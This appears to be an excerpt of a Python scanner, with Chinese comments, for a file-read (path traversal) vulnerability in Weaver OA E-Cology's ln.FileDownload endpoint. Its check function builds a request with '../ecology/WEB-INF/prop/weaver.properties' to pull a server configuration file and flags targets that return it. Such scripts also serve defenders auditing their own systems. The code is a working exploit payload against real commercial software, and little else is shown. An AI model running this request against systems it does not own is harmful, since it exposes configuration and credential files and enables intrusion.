...
def check_vulnerability(url):
    try:
        # 构建攻击URL
        attack_url = url.rstrip('/') + "/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/prop/weaver.properties"
        ...
        if response.status_code == 200 and 'ecology' in response.text:
            print(f"{RED}URL [{url}] 泛微OA E-Cology ln.FileDownload 文件读取漏洞。{RESET}")
        else:
...
def main():
    parser = argparse.ArgumentParser(description='检查目标URL是否存在泛微OA E-Cology ln.FileDownload 文件读取漏洞。')
